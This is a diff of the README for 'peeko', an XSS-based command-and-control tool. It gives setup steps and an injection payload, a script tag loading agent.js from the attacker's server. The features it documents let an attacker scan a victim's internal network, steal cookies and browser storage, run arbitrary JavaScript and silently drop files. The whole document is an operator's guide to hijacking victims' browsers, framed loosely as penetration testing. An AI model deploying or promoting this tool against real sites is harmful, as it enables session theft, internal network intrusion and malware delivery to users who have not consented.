@@ -1,23 +1,26 @@
-# peeko
+## peeko
 
 **Version:** v1.0
 
-peeko is a browser-based XSS-powered C2 (Command and Control) tool that leverages the victim’s browser as a stealthy proxy inside internal networks.
+`peeko` is a browser-based XSS-powered C2 (Command and Control) tool that leverages the victim’s browser as a stealthy proxy inside internal networks.
 
-Through an injected XSS payload, peeko establishes a WebSocket connection to a central server, allowing an attacker to remotely control the victim’s browser to send requests to internal services, scan networks, and exfiltrate data — all without dropping a single binary.
+Through an injected XSS payload, peeko establishes a WebSocket connection to a central server, allowing an attacker to remotely control the victim’s browser to send requests to internal services, scan networks, exfiltrate data, or even execute arbitrary JavaScript — all without dropping a single binary.
 
 ---
 
 ## Features
 
-- WebSocket-based communication between attacker and multiple victims  
-- Victim’s browser fetches internal URLs and scans IP ranges + ports  
-- Simple control panel with:  
+- WebSocket-based communication between attacker and victims  
+- Victim browser fetches internal URLs and scans IP ranges + ports  
+- Simple control panel with:
   - Victim selector  
   - Manual URL fetch  
   - IP and port range scanner  
-  - Log viewer with copy/save functionality  
-- Self-signed HTTPS support with auto-generated certificates  
+  - Custom JS execution (manual or automatic)  
+  - File delivery (auto/manual)  
+  - Browser info and token collection (cookies, storage, etc.)  
+  - Log viewer with copy/save as `.txt` or `.json`  
+- HTTPS support with self-signed certificates  
 - Lightweight: single Python file + static assets  
 
 ---
@@ -45,13 +48,13 @@ Through an injected XSS payload, peeko establishes a WebSocket connection to a c
     make install
     ```
 
-3. (Optional) Make scripts executable if needed:
+3. (Optional) Make scripts executable:
 
     ```bash
     chmod +x gen-cert.sh start.sh
     ```
 
-4. Generate a self-signed TLS certificate:
+4. Generate self-signed TLS certificate:
 
     ```bash
     make cert
@@ -59,62 +62,99 @@ Through an injected XSS payload, peeko establishes a WebSocket connection to a c
 
 5. Replace the `SERVER-IP` placeholder:
 
-    Open the following files and replace all occurrences of `SERVER-IP` with the actual IP address or domain of your machine:
+    Open and edit the following files:
 
     - `static/agent.js`
     - `static/control.html`
 
-    Example:
+    Replace `SERVER-IP` with the IP/domain of your server:
 
-    ```javascript
-    wss://SERVER-IP:8443/ws → wss://192.168.1.12:8443/ws
+    ```js
+    wss://SERVER-IP:8443/ws → wss://192.168.30.136:8443/ws
     ```
 
-6. Run the server:
+6. Start the server:
 
     ```bash
     make run
     ```
 
-7. Open your browser and access the control panel:
+7. Open the control panel in your browser:
 
     ```
-    https://SERVER-IP:8443/static/control.html
+    https://192.168.30.136:8443/static/control.html
     ```
 
-8. Inject the XSS payload (example):
+8. Inject the agent (example XSS):
 
     ```html
-    <script src="https://SERVER-IP:8443/static/agent.js"></script>
+    <script src="https://192.168.30.136:8443/static/agent.js"></script>
     ```
----
-
-## Usage
-
-### Control Panel
-
-- Choose a connected victim from the dropdown  
-- Input a manual URL to fetch via the victim  
-- Specify an IP range (e.g. `192.168.1.10-20` or `192.168.1.0/24`) and ports (e.g. `80,8080,3000-3010`) to scan  
-- Results will appear in the log viewer:  
-  - HTTP status  
-  - Body preview 
-- You can copy the log or save it as `.txt` or `.json`  
 
 ---
 
-### SERVER-IP Placeholder
+## Control Panel Features
 
-In both `agent.js` and `control.html`, the WebSocket connection points to:
+### Core Functions
 
-```javascript
-wss://SERVER-IP:8443/ws
-```
+- Select and manage connected victims  
+- Fetch any internal/external HTTPS URL via the victim  
+- Scan LAN ranges: `192.168.1.0/24`, `10.0.0.10-20`, etc.  
+- Scan specific ports or ranges (e.g., `80`, `443,8000-8080`)  
 
-**Before deploying**, replace `SERVER-IP` with your actual IP address (e.g. `192.168.1.12` or a public IP/domain). This ensures the victim browser and control panel can communicate with your server over HTTPS.
+### File Delivery
+
+- Send files to the victim (Base64 via WebSocket)  
+- Victim browser automatically downloads them  
+- Supports auto-upload on connect  
+
+### Info Gathering
+
+- Collect User Agent, platform, referrer, cookies, local/sessionStorage  
+- View results in JSON  
+- Triggered manually or auto-collect on connect  
+
+### Custom JS Execution
+
+- Run arbitrary JavaScript on the victim browser  
+- Use `exec:...` format to send  
+- Supports **auto-run** on connect  
+- Example: `exec:alert(document.cookie);`  
+
+### Logging
+
+- Everything is logged (requests, responses, info dumps)  
+- Copy or export logs as `.txt` or `.json`  
+- Minimalist UI designed like a terminal log  
 
 ---
 
+## CORS & Mixed Content Explained
+
+Modern browser policies affect what peeko can access.
+
+### CORS Responses
+
+| Header | Can read content? | Notes |
+|--------|-------------------|-------|
+| `Access-Control-Allow-Origin: *` | ✅ | Full access to response |
+| No header | ⚠️ | Response is opaque |
+| Restricted origin | ❌ | Blocked or unreadable |
+
+### Mixed Content
+
+Victim connects via HTTPS. If a scanned target only uses HTTP:
+
+- Browser will block mixed content requests  
+- peeko cannot read from `http://` endpoints  
+- Always prefer targets using HTTPS when scanning
+
+### In Practice
+
+During a penetration test, if you find an internal service that responds with `Access-Control-Allow-Origin: *` and is served over HTTPS, then peeko becomes a stealth proxy capable of exfiltrating internal data directly from the victim's browser without dropping any files or opening outbound connections.
+
+
+---
 
 ## Project Structure
 
@@ -136,43 +176,23 @@ peeko/
 
 ## Workflow
 
-1. Inject the payload into a vulnerable web application  
-2. Victim’s browser loads the agent and connects to your peeko server  
-3. From the control panel, you issue commands to fetch URLs or scan targets  
-4. peeko logs and returns the content of internal services  
+1. Attacker injects XSS (via stored or reflected vuln)  
+2. Victim’s browser connects via WebSocket to peeko server  
+3. Control panel lets attacker:  
+   - Scan network  
+   - Fetch URLs  
+   - Dump cookies, storage  
+   - Run arbitrary JS  
+   - Exfiltrate responses  
 
 ---
 
 ## Use Cases
 
-- Internal network exploration through browser footholds  
-- LAN service enumeration from inside the victim’s network   
-
----
-
-## CORS Behavior and Mixed Content Issues
-
-peeko uses `fetch()` from within the victim’s browser to request internal web services. Modern browsers enforce **CORS (Cross-Origin Resource Sharing)** policies that determine whether the attacker can read the response.
-
-### CORS Scenarios
-
-| Response Header                           | Works? | Explanation                                                |
-|-------------------------------------------|--------|------------------------------------------------------------|
-| `Access-Control-Allow-Origin: *`          | ✅     | You can read the full response body and status code.       |
-| *No* `Access-Control-Allow-Origin`        | ⚠️     | The request succeeds, but the response is opaque.          |
-| Restrictive CORS (e.g., specific domains) | ❌     | The browser blocks the response or hides its contents.     |
-
-### Mixed Content Issues
-
-Because peeko’s connection to the victim’s browser is over **HTTPS**, attempting to fetch **HTTP** (non-secure) URLs may result in **mixed content errors**. In modern browsers, these errors prevent the browser from loading or reading the HTTP resource. This means:
-
-- Even if a target HTTP service would respond with useful data, the victim’s browser will block or not expose that data to your script.
-- peeko can only extract and relay content from services that are accessible over HTTPS.
-
-### In Practice
-
-During a penetration test, if you find an internal service that responds with `Access-Control-Allow-Origin: *` and is served over HTTPS, then peeko becomes a stealth proxy capable of exfiltrating internal data directly from the victim's browser without dropping any files or opening outbound connections.
-
+- Internal network mapping via XSS  
+- SSRF augmentation  
+- Browser-based pivoting  
+- Silent file delivery / JS dropper  
 
 ---
 
